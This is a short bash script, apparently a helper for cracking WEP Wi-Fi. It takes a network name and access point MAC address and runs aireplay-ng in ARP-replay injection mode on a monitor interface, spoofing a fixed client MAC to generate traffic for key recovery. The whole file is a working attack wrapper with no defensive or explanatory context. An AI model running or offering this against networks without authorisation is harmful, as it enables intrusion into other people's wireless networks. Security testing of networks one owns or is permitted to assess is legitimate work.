#!/bin/bash

channel=10
essid=$1
apmac=$2
mymac="00:11:22:33:44:55"

if [ -z $1 ] ; then
    echo "Usage: ap-poke-wep.sh <essid> <apmac>"
else
    aireplay-ng -3 -b ${apmac} -h ${mymac} mon0
fi
